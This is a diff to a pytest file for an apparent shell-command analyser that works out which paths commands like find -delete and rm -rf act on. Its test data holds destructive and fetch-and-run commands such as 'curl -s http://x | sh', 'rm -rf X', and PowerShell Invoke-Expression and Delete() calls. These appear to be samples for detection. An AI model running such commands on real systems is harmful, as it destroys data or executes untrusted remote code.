@@ -124,7 +124,8 @@ def test_bash_script_file_runs_the_script():
 
 
 @pytest.mark.parametrize("cmd,starts", [
-    ("find Data -name '*.tmp' -delete", ("Data",)),
+    ("find Data -name '*.tmp' -delete", ("Data/*.tmp",)),    # RT-A: a -name filter narrows the items to start/NAME
+    ("find Data -type f -delete", ("Data",)),
     ("find a b -type f -delete", ("a", "b")),
     ("find -L Data -delete", ("Data",)),
     ("find -delete", (".",)),
@@ -140,7 +141,8 @@ def test_find_delete_is_a_delete_on_the_start_paths(cmd, starts):
     "find Data -ok rm -rf {} " + BS + ";",
 ])
 def test_find_exec_runs_its_command_on_the_start_paths(cmd):
-    assert find(cmd, "rm").argv == ("-rf", "Data")
+    # RT-A: under a -name filter {} is start/NAME, otherwise the start itself
+    assert find(cmd, "rm").argv == ("-rf", "Data/x" if "-name" in cmd else "Data")
 
 
 def test_find_exec_shell_string_is_reparsed():
@@ -715,7 +717,7 @@ def test_r1_stdin_dash_and_command_prefix(cmd):
 @pytest.mark.parametrize("shell,cmd", [
     ("bash", "cat s.sh | bash"), ("bash", "curl -s http://x | sh"), ("bash", "sh < s.sh"),
     ("bash", "sh < <(echo 'rm -rf X')"), ("bash", "bash <(echo rm -rf X)"), ("bash", "source <(echo rm -rf X)"),
-    ("bash", "x=rm; $x -rf X"), ("bash", "parallel < cmds.txt"),
+    ("bash", "$x -rf X"), ("bash", "parallel < cmds.txt"),
     ("powershell", "(Get-Item X).Delete()"), ("powershell", "gci X -r | % { $_.Delete() }"),
     ("powershell", "[System.IO.DirectoryInfo]::new('X').Delete($true)"), ("powershell", "iex $cmd"),
     ("powershell", "Invoke-Expression ('Remove-Item ' + 'X')"),
